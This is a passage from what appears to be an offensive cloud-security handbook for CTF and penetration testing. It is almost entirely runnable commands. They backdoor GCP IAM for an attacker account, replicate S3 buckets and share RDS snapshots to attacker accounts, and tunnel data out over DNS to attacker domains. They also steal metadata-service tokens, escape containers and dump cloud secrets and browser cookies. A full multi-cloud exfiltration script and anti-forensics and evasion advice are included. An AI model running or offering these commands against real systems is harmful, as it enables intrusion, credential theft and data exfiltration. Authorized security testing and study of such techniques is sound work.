gcloud organizations add-iam-policy-binding ORGANIZATION_ID \
  --member="user:attacker@gmail.com" \
  --role="roles/editor"

# At project level (less visible)
gcloud projects add-iam-policy-binding PROJECT_ID \
   --member="user:attacker@gmail.com"  
   --role="roles/owner"

# At folder level (affects multiple projects)

gcloud resource-manager folders add-iam-policy-binding FOLDER_ID  
--member="user:attacker@gmail.com"  
--role="roles/resourcemanager.folderAdmin"
````

**Custom Role with Hidden Permissions**
```bash
# Create custom role with broad permissions but innocuous name
cat > custom_role.yaml << 'EOF'
title: "Log Viewer"
description: "Read-only access to logs"
stage: "GA"
includedPermissions:
- logging.logs.list
- compute.instances.list
- iam.serviceAccounts.actAs
- iam.serviceAccountKeys.create
- compute.instances.setMetadata
EOF

gcloud iam roles create LogViewer \
  --project=PROJECT_ID \
  --file=custom_role.yaml

# Assign to attacker-controlled account
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@gmail.com" \
  --role="projects/PROJECT_ID/roles/LogViewer"
````

**Workload Identity Federation Backdoor**

```bash
# Create workload identity pool for external access
gcloud iam workload-identity-pools create attacker-pool \
  --location="global" \
  --display-name="External CI/CD Integration"

# Create provider
gcloud iam workload-identity-pools providers create-oidc attacker-provider \
  --location="global" \
  --workload-identity-pool="attacker-pool" \
  --issuer-uri="https://attacker-controlled-idp.com" \
  --allowed-audiences="gcp-project"

# Bind service account
gcloud iam service-accounts add-iam-policy-binding \
  privileged-sa@PROJECT_ID.iam.gserviceaccount.com \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/attacker-pool/*"
```

### Pacu Persistence Modules

```bash
# Launch Pacu
pacu

# Backdoor all users with additional access keys
run iam__backdoor_users_keys

# Backdoor IAM roles by modifying assume role policies
run iam__backdoor_assume_role

# Create backdoor Lambda functions
run lambda__backdoor_new_roles

# Backdoor EC2 user data
run ec2__backdoor_ec2_sec_groups
```

### Multi-Cloud Persistence Tool: Nebula

```bash
# Installation
git clone https://github.com/gl4ssesbo1/Nebula.git
cd Nebula
pip3 install -r requirements.txt

# [Unverified] Tool may require updates for current cloud API versions

# AWS persistence
python3 nebula.py aws --access-key KEY --secret-key SECRET persist

# Azure persistence
python3 nebula.py azure --tenant TENANT_ID --client-id CLIENT_ID --secret SECRET persist

# GCP persistence
python3 nebula.py gcp --project PROJECT_ID --credentials creds.json persist
```

## Exfiltration Tools

### AWS S3 Exfiltration

**AWS CLI Sync (Standard Method)**

```bash
# Download entire S3 bucket
aws s3 sync s3://target-bucket ./exfil --profile compromised

# Selective exfiltration by file type
aws s3 sync s3://target-bucket ./exfil --exclude "*" --include "*.xlsx" --include "*.docx"

# Rate-limited exfiltration to avoid detection
aws s3 sync s3://target-bucket ./exfil --profile compromised --max-bandwidth 100KB
```

**S3 Presigned URLs**

```bash
# Generate presigned URLs for external download (bypasses authentication logs)
aws s3 presign s3://target-bucket/sensitive-file.zip --expires-in 604800 --profile compromised

# Batch generate presigned URLs
aws s3 ls s3://target-bucket --recursive | awk '{print $4}' | while read file; do
  echo "File: $file"
  aws s3 presign "s3://target-bucket/$file" --expires-in 604800 --profile compromised
  echo "---"
done > presigned_urls.txt

# [Inference] Download from external system without AWS credentials
wget -i presigned_urls.txt
```

**S3 Bucket Replication**

```bash
# Setup replication to attacker-controlled bucket
cat > replication_config.json << 'EOF'
{
  "Role": "arn:aws:iam::VICTIM_ACCOUNT:role/ReplicationRole",
  "Rules": [
    {
      "Status": "Enabled",
      "Priority": 1,
      "DeleteMarkerReplication": { "Status": "Disabled" },
      "Filter": {},
      "Destination": {
        "Bucket": "arn:aws:s3:::attacker-exfil-bucket",
        "Account": "ATTACKER_ACCOUNT",
        "AccessControlTranslation": {
          "Owner": "Destination"
        }
      }
    }
  ]
}
EOF

# Enable versioning (required for replication)
aws s3api put-bucket-versioning \
  --bucket target-bucket \
  --versioning-configuration Status=Enabled

# Apply replication configuration
aws s3api put-bucket-replication \
  --bucket target-bucket \
  --replication-configuration file://replication_config.json

# Data automatically replicates to attacker bucket
```

**S3 Glacier Vault Lock Bypass**

```bash
# If data in Glacier, initiate retrieval
aws glacier initiate-job \
  --account-id - \
  --vault-name target-vault \
  --job-parameters '{"Type":"archive-retrieval","ArchiveId":"ARCHIVE_ID","Description":"Restore request"}'

# Check job status
aws glacier describe-job \
  --account-id - \
  --vault-name target-vault \
  --job-id JOB_ID

# Download output when complete
aws glacier get-job-output \
  --account-id - \
  --vault-name target-vault \
  --job-id JOB_ID \
  output.dat
```

### Pacu Exfiltration Modules

```bash
# S3 bucket enumeration and download
run s3__bucket_finder
run s3__download_bucket --bucket target-bucket

# EBS snapshot exfiltration
run ebs__enum_volumes_snapshots
run ebs__download_snapshots --snapshot-ids snap-xxxxx

# RDS snapshot exfiltration
run rds__explore_snapshots
run rds__snapshot_rds_backup --instance-id db-instance

# Lambda code exfiltration
run lambda__enum
run lambda__download_code

# EC2 userdata exfiltration
run ec2__enum
run ec2__download_userdata
```

### S3Scanner (Bucket Enumeration Tool)

```bash
# Installation
git clone https://github.com/sa7mon/S3Scanner.git
cd S3Scanner
pip3 install -r requirements.txt

# Scan for open buckets
python3 s3scanner.py --include-closed --out-file results.txt buckets.txt

# Test write access
python3 s3scanner.py --dump writable buckets.txt

# Enumerate bucket contents
python3 s3scanner.py --list buckets.txt
```

### Cloud Storage Miner

```bash
# Multi-cloud storage discovery and download
git clone https://github.com/ine-labs/Cloud-Storage-Miner.git
cd Cloud-Storage-Miner

# AWS S3 mining
python3 cloud_storage_miner.py --provider aws --keywords "company,prod,backup"

# Azure Blob Storage mining
python3 cloud_storage_miner.py --provider azure --keywords "company,prod,backup"

# GCP Cloud Storage mining
python3 cloud_storage_miner.py --provider gcp --keywords "company,prod,backup"
```

### AWS Database Exfiltration

**RDS Snapshot Sharing**

```bash
# Create snapshot of target RDS instance
aws rds create-db-snapshot \
  --db-instance-identifier target-db \
  --db-snapshot-identifier exfil-snapshot

# Share snapshot with attacker account
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier exfil-snapshot \
  --attribute-name restore \
  --values-to-add ATTACKER_ACCOUNT_ID

# From attacker account, restore snapshot
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier restored-db \
  --db-snapshot-identifier arn:aws:rds:us-east-1:VICTIM_ACCOUNT:snapshot:exfil-snapshot \
  --publicly-accessible

# Access restored database
mysql -h restored-db.xxxxx.us-east-1.rds.amazonaws.com -u admin -p
mysqldump --all-databases > complete_exfil.sql
```

**DynamoDB Export**

```bash
# Export DynamoDB table to S3
aws dynamodb export-table-to-point-in-time \
  --table-arn arn:aws:dynamodb:us-east-1:123456789012:table/TargetTable \
  --s3-bucket attacker-exfil-bucket \
  --s3-prefix dynamodb-export/ \
  --export-format DYNAMODB_JSON

# Download from S3
aws s3 sync s3://attacker-exfil-bucket/dynamodb-export/ ./dynamodb-data/

# [Inference] Large exports may be less suspicious than high-volume query operations
```

**DocumentDB Backup**

```bash
# Create manual snapshot
aws docdb create-db-cluster-snapshot \
  --db-cluster-identifier target-docdb-cluster \
  --db-cluster-snapshot-identifier exfil-docdb-snapshot

# Share with attacker account
aws docdb modify-db-cluster-snapshot-attribute \
  --db-cluster-snapshot-identifier exfil-docdb-snapshot \
  --attribute-name restore \
  --values-to-add ATTACKER_ACCOUNT_ID
```

### Azure Exfiltration

**Azure Storage Account Data**

```bash
# List storage accounts
az storage account list --query '[].{Name:name, ResourceGroup:resourceGroup}'

# Get storage account keys
az storage account keys list \
  --resource-group RG \
  --account-name storageaccount

# Download blobs
az storage blob download-batch \
  --account-name storageaccount \
  --account-key KEY \
  --source container-name \
  --destination ./exfil/

# Azcopy for large-scale exfiltration
azcopy login --identity
azcopy copy "https://storageaccount.blob.core.windows.net/container/*" "./exfil/" --recursive
```

**Azure SQL Database Export**

```bash
# Export database to blob storage
az sql db export \
  --resource-group RG \
  --server sql-server \
  --name database-name \
  --admin-user admin \
  --admin-password PASSWORD \
  --storage-key STORAGE_KEY \
  --storage-key-type StorageAccessKey \
  --storage-uri "https://storageaccount.blob.core.windows.net/exports/db-export.bacpac"

# Download BACPAC file
az storage blob download \
  --account-name storageaccount \
  --container-name exports \
  --name db-export.bacpac \
  --file ./db-export.bacpac
```

**Azure Managed Disk Snapshot**

```bash
# Create snapshot of VM disk
az snapshot create \
  --resource-group RG \
  --name disk-snapshot \
  --source /subscriptions/SUB_ID/resourceGroups/RG/providers/Microsoft.Compute/disks/disk-name

# Grant access to snapshot (generates SAS URL)
az snapshot grant-access \
  --resource-group RG \
  --name disk-snapshot \
  --duration-in-seconds 3600

# Download snapshot using AzCopy
azcopy copy "SAS_URL" "./disk-snapshot.vhd"

# Mount VHD locally for analysis
sudo modprobe nbd
sudo qemu-nbd -c /dev/nbd0 disk-snapshot.vhd
sudo mount /dev/nbd0p1 /mnt/snapshot
```

**Azure Key Vault Exfiltration**

```bash
# List all secrets
az keyvault secret list --vault-name keyvault-name --query '[].id'

# Dump all secrets
for secret in $(az keyvault secret list --vault-name keyvault-name --query '[].name' -o tsv); do
  echo "Secret: $secret"
  az keyvault secret show --vault-name keyvault-name --name "$secret" --query 'value' -o tsv
  echo "---"
done > secrets_dump.txt

# Export certificates
az keyvault certificate list --vault-name keyvault-name --query '[].id'
az keyvault certificate download \
  --vault-name keyvault-name \
  --name cert-name \
  --file cert.pem
```

### GCP Exfiltration

**Cloud Storage Bucket Download**

```bash
# Download entire bucket
gsutil -m cp -r gs://target-bucket ./exfil/

# Selective download by file type
gsutil -m cp -r gs://target-bucket/**/*.pdf ./exfil/

# Generate signed URLs for external download
gsutil signurl -d 7d service-account-key.json gs://target-bucket/file.zip

# Batch signed URL generation
gsutil ls -r gs://target-bucket/** | while read file; do
  gsutil signurl -d 7d service-account-key.json "$file"
done > signed_urls.txt
```

**BigQuery Data Exfiltration**

```bash
# Export BigQuery table to Cloud Storage
bq extract \
  --destination_format=CSV \
  --compression=GZIP \
  PROJECT_ID:DATASET.TABLE \
  gs://attacker-bucket/bigquery-export/*.csv

# Download from Cloud Storage
gsutil -m cp -r gs://attacker-bucket/bigquery-export/ ./exfil/

# Direct query and download (smaller datasets)
bq query --format=csv --max_rows=1000000 \
  'SELECT * FROM `PROJECT_ID.DATASET.TABLE`' > exfil.csv
```

**Cloud SQL Export**

```bash
# Export Cloud SQL database to Cloud Storage
gcloud sql export sql INSTANCE_NAME \
  gs://attacker-bucket/sql-export/database.sql \
  --database=database-name

# Download SQL dump
gsutil cp gs://attacker-bucket/sql-export/database.sql ./exfil/

# Create on-demand backup and export
gcloud sql backups create --instance=INSTANCE_NAME
gcloud sql backups list --instance=INSTANCE_NAME

# [Inference] Backups may be less monitored than live database queries
```

**Compute Engine Disk Snapshot**

```bash
# Create snapshot of persistent disk
gcloud compute disks snapshot DISK_NAME \
  --snapshot-names=exfil-snapshot \
  --zone=us-central1-a

# Create disk from snapshot in attacker project
gcloud compute disks create restored-disk \
  --source-snapshot=exfil-snapshot \
  --zone=us-central1-a \
  --project=ATTACKER_PROJECT

# Create instance with restored disk
gcloud compute instances create analysis-vm \
  --disk=name=restored-disk,boot=yes \
  --zone=us-central1-a \
  --project=ATTACKER_PROJECT

# SSH and exfiltrate data
gcloud compute ssh analysis-vm --zone=us-central1-a --project=ATTACKER_PROJECT
```

**Firestore/Datastore Export**

```bash
# Export Firestore to Cloud Storage
gcloud firestore export gs://attacker-bucket/firestore-export/ \
  --collection-ids='users,transactions,secrets'

# Download exported data
gsutil -m cp -r gs://attacker-bucket/firestore-export/ ./exfil/
```

### DNS Exfiltration

**Manual DNS Tunneling**

```bash
# Encode data in DNS queries
# Useful when egress traffic is restricted but DNS is allowed

# Split data into chunks and encode
cat sensitive_data.txt | base64 | fold -w 32 | while read chunk; do
  dig $chunk.exfil.attacker-domain.com
  sleep 1
done

# Listener on attacker DNS server logs queries
# Reassemble data from DNS logs
```

**dnscat2 (DNS Tunneling Tool)**

```bash
# On attacker server (Kali)
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install
ruby dnscat2.rb exfil.attacker-domain.com

# On victim cloud instance
wget https://github.com/iagox86/dnscat2/releases/download/v0.07/dnscat2-v0.07-client-x64
chmod +x dnscat2-v0.07-client-x64
./dnscat2-v0.07-client-x64 exfil.attacker-domain.com

# Upload files through tunnel
# From dnscat2 server console
download /path/to/sensitive/file
```

**iodine (IP over DNS)**

```bash
# On attacker server
sudo apt install iodine
sudo iodined -f -c -P secretpassword 10.0.0.1 exfil.attacker-domain.com

# On victim cloud instance
sudo iodine -f -P secretpassword exfil.attacker-domain.com
# Creates network tunnel through DNS
# Route exfiltration traffic through tunnel
```

### Metadata Service Exploitation

**AWS EC2 Metadata Harvesting**

```bash
# From compromised EC2 instance
# Extract instance profile credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME

# Extract user-data (may contain secrets)
curl http://169.254.169.254/latest/user-data

# IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```

**Azure IMDS Exploitation**

```bash
# From compromised Azure VM
# Extract managed identity token
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Extract instance metadata
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Use token to access Azure resources
ACCESS_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r '.access_token')

curl -H "Authorization: Bearer $ACCESS_TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

**GCP Metadata Server**

```bash
# From compromised GCP instance
# Extract service account token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Extract service account email
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Use token for GCP API calls
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r '.access_token')

curl -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/storage/v1/b?project=PROJECT_ID"
```

### SSRF to Cloud Metadata

**Capital One Breach Style (SSRF → IMDS)**

```bash
# If web application vulnerable to SSRF
# Access cloud metadata through SSRF

# AWS IMDS
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Azure IMDS
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP metadata
curl "http://vulnerable-app.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# [Inference] Many WAFs and security tools may not block internal IP ranges in SSRF contexts
```

### Steganography for Exfiltration

**Embed Data in Images**

```bash
# Use steghide to hide data in images
steghide embed -cf innocent_image.jpg -ef sensitive_data.zip -p password

# Upload to cloud storage or social media
aws s3 cp innocent_image.jpg s3://public-bucket/vacation-photo.jpg --acl public-read

# Download and extract from external location
steghide extract -sf innocent_image.jpg -p password
```

**Embed in DNS TXT Records**

```bash
# Encode data and create DNS TXT records
cat sensitive_data.txt | base64 | fold -w 255 | nl | while read num chunk; do
  aws route53 change-resource-record-sets --hosted-zone-id ZONE_ID --change-batch '{
    "Changes": [{
      "Action": "CREATE",
      "ResourceRecordSet": {
        "Name": "exfil-'$num'.attacker-domain.com",
        "Type": "TXT",
        "TTL": 300,
        "ResourceRecords": [{"Value": "\"'$chunk'\""}]
      }
    }]
  }'
done

# Query TXT records to retrieve data
for i in {1..100}; do
  dig TXT exfil-$i.attacker-domain.com +short
done | tr -d '"' | base64 -d > recovered_data.txt
```

### CloudBrute (Cloud Infrastructure Discovery)

```bash
# Installation
git clone https://github.com/0xsha/CloudBrute.git
cd CloudBrute
go build

# Discover cloud assets for exfiltration targets
./CloudBrute -d company.com -k keywords.txt -m aws
./CloudBrute -d company.com -k keywords.txt -m azure
./CloudBrute -d company.com -k keywords.txt -m gcp

# Output includes discoverable storage buckets and cloud services
```

### Cred Dump from Cloud Services

**AWS Systems Manager Parameter Store**

```bash
# Dump all parameters
aws ssm describe-parameters --query 'Parameters[*].Name' --output text | while read param; do
  echo "Parameter: $param"
  aws ssm get-parameter --name "$param" --with-decryption --query 'Parameter.Value' --output text
  echo "---"
done > ssm_dump.txt
```

**AWS Secrets Manager**

```bash
# List all secrets
aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text | while read secret; do
  echo "Secret: $secret"
  aws secretsmanager get-secret-value --secret-id "$secret" --query 'SecretString' --output text
  echo "---"
done > secrets_dump.txt
```

**Azure Key Vault (Already covered above)**

**GCP Secret Manager**

```bash
# List all secrets
gcloud secrets list --format="value(name)" | while read secret; do
  echo "Secret: $secret"
  gcloud secrets versions access latest --secret="$secret"
  echo "---"
done > gcp_secrets_dump.txt
```

### Container/Kubernetes Exfiltration

**EKS/AKS/GKE Pod Escape and Exfiltration**

```bash
# From compromised container
# Check for privileged mode or capabilities
capsh --print

# Mount host filesystem if privileged
mkdir /host
mount /dev/sda1 /host
cat /host/etc/shadow

# Access cloud metadata from pod
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract secrets from Kubernetes
kubectl get secrets --all-namespaces -o json > k8s_secrets.json

# Extract configmaps
kubectl get configmaps --all-namespaces -o json > k8s_configmaps.json
```

**Docker Container Escape Techniques**

```bash
# Check if running in container
cat /proc/1/cgroup | grep docker

# Exploit Docker socket if mounted
# [Inference] Docker socket exposure allows full host control
if [ -e /var/run/docker.sock ]; then
  docker run -it -v /:/host alpine chroot /host
fi

# Exploit capabilities
# CAP_SYS_ADMIN allows mounting
if capsh --print | grep -q cap_sys_admin; then
  mkdir /mnt/host
  mount -t proc none /mnt/host/proc
fi
```

### Automated Multi-Cloud Exfiltration Framework

**Custom Exfiltration Script**

```bash
#!/bin/bash
# multi_cloud_exfil.sh - Automated exfiltration across cloud providers

EXFIL_DIR="./exfil_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EXFIL_DIR"

echo "[*] Starting multi-cloud exfiltration"

# AWS Exfiltration
if command -v aws &> /dev/null; then
  echo "[*] AWS exfiltration started"
  
  # S3 Buckets
  aws s3 ls | awk '{print $3}' | while read bucket; do
    mkdir -p "$EXFIL_DIR/aws/s3/$bucket"
    aws s3 sync "s3://$bucket" "$EXFIL_DIR/aws/s3/$bucket" --quiet 2>/dev/null &
  done
  
  # Secrets Manager
  aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text | while read secret; do
    aws secretsmanager get-secret-value --secret-id "$secret" --query 'SecretString' --output text >> "$EXFIL_DIR/aws/secrets.txt"
  done
  
  # Parameter Store
  aws ssm describe-parameters --query 'Parameters[*].Name' --output text | while read param; do
    aws ssm get-parameter --name "$param" --with-decryption --query 'Parameter.Value' --output text >> "$EXFIL_DIR/aws/parameters.txt"
  done
  
  # RDS Snapshots
  aws rds describe-db-snapshots --query 'DBSnapshots[*].[DBSnapshotIdentifier,DBInstanceIdentifier]' --output text >> "$EXFIL_DIR/aws/rds_snapshots.txt"
fi

# Azure Exfiltration
if command -v az &> /dev/null; then
  echo "[*] Azure exfiltration started"
  
  # Storage Accounts
  az storage account list --query '[].name' -o tsv | while read storage; do
    mkdir -p "$EXFIL_DIR/azure/storage/$storage"
    KEY=$(az storage account keys list --account-name "$storage" --query '[0].value' -o tsv)
    az storage blob download-batch --account-name "$storage" --account-key "$KEY" --source '$root' --destination "$EXFIL_DIR/azure/storage/$storage" 2>/dev/null &
  done
  
  # Key Vaults
  az keyvault list --query '[].name' -o tsv | while read vault; do
    az keyvault secret list --vault-name "$vault" --query '[].name' -o tsv | while read secret; do
      az keyvault secret show --vault-name "$vault" --name "$secret" --query 'value' -o tsv >> "$EXFIL_DIR/azure/keyvault_${vault}.txt"
    done
  done
fi

# GCP Exfiltration
if command -v gcloud &> /dev/null; then
  echo "[*] GCP exfiltration started"
  
  # Cloud Storage
  gsutil ls | while read bucket; do
    mkdir -p "$EXFIL_DIR/gcp/storage/$(basename $bucket)"
    gsutil -m cp -r "$bucket" "$EXFIL_DIR/gcp/storage/" 2>/dev/null &
  done
  
  # Secret Manager
  gcloud secrets list --format="value(name)" | while read secret; do
    gcloud secrets versions access latest --secret="$secret" >> "$EXFIL_DIR/gcp/secrets.txt"
  done
fi

wait  # Wait for all background jobs to complete

# Compress exfiltration data
echo "[*] Compressing exfiltrated data"
tar -czf "${EXFIL_DIR}.tar.gz" "$EXFIL_DIR"

# Optional: Exfiltrate via DNS/HTTP/custom channel
echo "[*] Exfiltration complete: ${EXFIL_DIR}.tar.gz"
```

---

## Key Operational Considerations

### Anti-Forensics Best Practices

1. **Credential Rotation**: Rotate credentials immediately after privilege escalation
2. **Timestamp Manipulation**: Where possible, maintain original file timestamps
3. **Log Cleanup**: Remove or modify logs of exfiltration activities (covered in previous section)
4. **Traffic Obfuscation**: Use encryption and legitimate protocols for data transfer
5. **Gradual Exfiltration**: Spread exfiltration over time to avoid bandwidth anomalies

### Detection Indicators to Avoid

- **High API call volume** from single identity
- **Unusual data access patterns** (accessing resources never previously accessed)
- **Geographical anomalies** (access from unexpected locations)
- **Time-based anomalies** (activity outside business hours)
- **Bulk operations** (mass downloads, snapshot creation, policy changes)
- **Cross-account activity** (unusual assume-role operations)

### Legal and Ethical Warnings

⚠️ **Critical Disclaimers**:

- All techniques described are for **authorized CTF competitions and penetration testing only**
- Unauthorized access to cloud infrastructure is **illegal** under CFAA (US), Computer Misuse Act (UK), and similar international laws
- Many described actions **violate cloud provider Terms of Service** and can result in account termination and legal action
- **Always obtain written authorization** before testing cloud infrastructure
- **Never test on production systems** without explicit permission and proper safeguards

### Tool Limitations and Updates

[Unverified] Many cloud exploitation tools require regular updates as cloud providers:

- Modify API endpoints and authentication mechanisms
- Implement new security controls and detection capabilities
- Deprecate older API versions
- Change IAM permission models

Always verify tool compatibility with current cloud provider APIs before relying on automated exploitation.

---

**Recommended Related Topics**:

- Cloud forensics and incident response procedures
- Advanced API abuse and rate limit bypass techniques
- Container escape and Kubernetes security exploitation
- Cloud-specific malware development and C2 infrastructure

---

# Credential Management

Credential management in CTF scenarios involves discovering, extracting, and leveraging authentication materials across various storage locations and formats. This encompasses access keys, tokens, credential files, and environment variables that enable privilege escalation and lateral movement.

## Access Key Discovery

Access keys represent programmatic authentication credentials for cloud services and APIs. Discovery requires systematic enumeration of multiple locations where keys may persist.

### Cloud Provider Key Formats

**AWS Access Keys**

```bash
# Pattern: AKIA[0-9A-Z]{16}
# Secret: [A-Za-z0-9/+=]{40}
grep -r "AKIA[0-9A-Z]\{16\}" /home /var /opt 2>/dev/null

# Search with ripgrep (faster alternative)
rg "AKIA[0-9A-Z]{16}" -t -i 2>/dev/null
```

**Azure Access Keys**

```bash
# Storage account keys (base64, 88 chars)
grep -r "AccountKey=[A-Za-z0-9+/=]\{88\}" /etc /home /var 2>/dev/null

# Service principal credentials
find / -name "*.json" -exec grep -l "clientSecret\|password" {} \; 2>/dev/null
```

**Google Cloud Keys**

```bash
# Service account JSON keys
find / -name "*service*account*.json" -o -name "*gcp*.json" 2>/dev/null
grep -r "private_key_id" /home /var /opt 2>/dev/null
```

### SSH Key Discovery

```bash
# User SSH private keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# Check permissions (writable keys indicate misconfiguration)
find / -name "id_*" -type f -perm -o+w 2>/dev/null

# Authorized keys files
find / -name "authorized_keys" 2>/dev/null

# SSH config files with potential key paths
cat ~/.ssh/config /etc/ssh/ssh_config 2>/dev/null | grep -i "identityfile"
```

### API Key Discovery

```bash
# Generic API key patterns
grep -rE "api[_-]?key['\"]?\s*[:=]\s*['\"]?[A-Za-z0-9_\-]{32,}" /var/www /home 2>/dev/null

# GitHub personal access tokens (ghp_, gho_, ghu_, ghs_, ghr_)
grep -rE "gh[pousr]_[A-Za-z0-9]{36}" / 2>/dev/null

# GitLab tokens
grep -rE "glpat-[A-Za-z0-9_\-]{20}" / 2>/dev/null

# Slack tokens
grep -rE "xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{24,32}" / 2>/dev/null
```

### Database Credentials Discovery

```bash
# MySQL configuration files
cat /etc/mysql/my.cnf /etc/my.cnf ~/.my.cnf ~/.mysql_history 2>/dev/null

# PostgreSQL password file
cat ~/.pgpass /var/lib/postgresql/.pgpass 2>/dev/null

# MongoDB configuration
cat /etc/mongod.conf ~/.mongorc.js 2>/dev/null

# Database connection strings
grep -rE "(mongodb|mysql|postgresql|mssql)://[^'\"]*:[^'\"]*@" /var/www /opt /home 2>/dev/null
```

### File System Search Strategies

```bash
# Find recently modified credential files
find / -type f \( -name "*key*" -o -name "*secret*" -o -name "*password*" -o -name "*credential*" \) -mtime -30 2>/dev/null

# Search backup directories
find /var/backups /backup /tmp -type f -name "*.sql" -o -name "*.bak" -o -name "*.old" 2>/dev/null

# Writable directories containing configs
find / -writable -type d 2>/dev/null | while read dir; do find "$dir" -name "*.conf" -o -name "*.config" 2>/dev/null; done
```

## Token Extraction

Tokens represent temporary or session-based authentication credentials requiring extraction from memory, processes, or storage.

### Process Memory Extraction

```bash
# Dump process memory (requires root or ptrace capability)
gcore -o /tmp/process_dump <PID>

# Extract strings from core dump
strings /tmp/process_dump.<PID> | grep -iE "(token|bearer|jwt|session)"

# Using gdb for memory dumping
gdb -p <PID>
(gdb) generate-core-file /tmp/process_core
(gdb) quit

# Search process environment
cat /proc/<PID>/environ | tr '\0' '\n' | grep -i token
```

### Browser Token Extraction

**Chrome/Chromium**

```bash
# Cookies database
cp ~/.config/google-chrome/Default/Cookies /tmp/chrome_cookies
sqlite3 /tmp/chrome_cookies "SELECT host_key, name, value FROM cookies WHERE name LIKE '%token%' OR name LIKE '%session%';"

# Local storage
cat ~/.config/google-chrome/Default/Local\ Storage/leveldb/*.log | strings | grep -iE "(token|bearer)"
```

**Firefox**

```bash
# Cookies
sqlite3 ~/.mozilla/firefox/*.default*/cookies.sqlite "SELECT host, name, value FROM moz_cookies WHERE name LIKE '%token%';"

# Session storage
cat ~/.mozilla/firefox/*.default*/sessionstore.js | jq -r '.windows[].tabs[].entries[].formdata' 2>/dev/null
```

### JWT Token Extraction

```bash
# Decode JWT without verification
jwt_decode() {
    local jwt=$1
    jq -R 'split(".") | .[1] | @base64d | fromjson' <<< "$jwt"
}

# Extract JWTs from files
grep -roE "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" /var/log /tmp /var/www 2>/dev/null

# Extract from HTTP headers in logs
grep -rE "Authorization: Bearer eyJ" /var/log/apache2 /var/log/nginx 2>/dev/null | cut -d' ' -f4
```

### Session Token Extraction

```bash
# Web application session files
find /var/lib/php/sessions /tmp -name "sess_*" 2>/dev/null
cat /var/lib/php/sessions/sess_* 2>/dev/null

# Memcached session extraction
echo "stats items" | nc localhost 11211
echo "stats cachedump <slab_id> <limit>" | nc localhost 11211
echo "get <session_key>" | nc localhost 11211

# Redis session extraction
redis-cli KEYS "sess:*"
redis-cli GET "sess:<session_id>"
```

### OAuth Token Extraction

```bash
# Access tokens in application storage
find ~/.local/share ~/.config -name "*.json" -exec grep -l "access_token\|refresh_token" {} \; 2>/dev/null

# Token cache files
cat ~/.aws/credentials ~/.azure/accessTokens.json ~/.config/gcloud/access_tokens.db 2>/dev/null
```

## Credential File Locations

Credential files follow predictable naming conventions and storage paths across different systems and applications.

### Linux Credential Files

**System Credentials**

```bash
# Shadow password file
cat /etc/shadow

# PAM credentials
cat /etc/security/opasswd

# Sudoers file (may contain passwords in NOPASSWD exceptions)
cat /etc/sudoers /etc/sudoers.d/* 2>/dev/null

# Network authentication
cat /etc/ppp/pap-secrets /etc/ppp/chap-secrets 2>/dev/null
```

**User Credential Files**

```bash
# Bash history (often contains credentials)
cat ~/.bash_history ~/.*_history 2>/dev/null | grep -iE "(password|passwd|pwd|pass|key|token)"

# SSH files
ls -la ~/.ssh/
cat ~/.ssh/id_* ~/.ssh/known_hosts ~/.ssh/authorized_keys 2>/dev/null

# Configuration files
cat ~/.netrc ~/.git-credentials ~/.docker/config.json 2>/dev/null

# Shell configuration
cat ~/.bashrc ~/.profile ~/.zshrc 2>/dev/null | grep -iE "(export.*PASS|export.*KEY|export.*TOKEN)"
```

### Windows Credential Files

[Inference] Windows credential extraction requires different tooling; the following paths are common storage locations:

```bash
# From Linux attacking Windows (SMB mounted)
cat /mnt/windows/Users/*/AppData/Local/Microsoft/Credentials/* 2>/dev/null
cat /mnt/windows/Windows/System32/config/SAM 2>/dev/null
cat /mnt/windows/Users/*/NTUSER.DAT 2>/dev/null

# Credential Manager (encrypted, requires DPAPI decryption)
# Location: %APPDATA%\Microsoft\Credentials\
# Requires specialized tools like mimikatz or pypykatz
```

### Application-Specific Credentials

**Web Servers**

```bash
# Apache
cat /etc/apache2/.htpasswd /var/www/.htpasswd 2>/dev/null
grep -r "AuthUserFile\|DBDParams" /etc/apache2 2>/dev/null

# Nginx
cat /etc/nginx/.htpasswd 2>/dev/null
grep -r "auth_basic_user_file\|proxy_set_header Authorization" /etc/nginx 2>/dev/null

